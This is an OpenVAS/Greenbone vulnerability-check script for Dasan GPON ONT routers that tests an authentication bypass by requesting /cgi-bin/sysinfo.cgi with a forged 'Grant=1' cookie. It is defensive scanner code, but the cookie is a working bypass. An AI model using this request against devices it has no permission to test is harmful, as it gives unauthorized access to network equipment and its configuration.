# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:dansan_networks:gpon_ont";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106952");
  script_version("2025-03-20T05:38:32+0000");
  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2017-07-14 11:20:16 +0700 (Fri, 14 Jul 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Dasan Networks GPON ONT Devices Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_dasan_gpon_ont_detect.nasl");
  script_mandatory_keys("dasan_gpon_ont/detected");

  script_tag(name:"summary", value:"Dasan Networks GPON ONT devices are prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Authentication Bypass

  - Cross-site request forgery (CSRF)

  - Privilege Escalation

  - System Config Download and Upload");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5421.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5422.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5423.php");
  script_xref(name:"URL", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5424.php");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/cgi-bin/sysinfo.cgi";
cookie = "Grant=1; Language=english; silverheader=3c";

if (http_vuln_check(port: port, url: url, pattern: "System Information", check_header: TRUE,
                    extra_check: "lbl_version", cookie: cookie)) {
  report = "It was possible to bypass authentication and access '/cgi-bin/sysinfo.cgi'.";
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
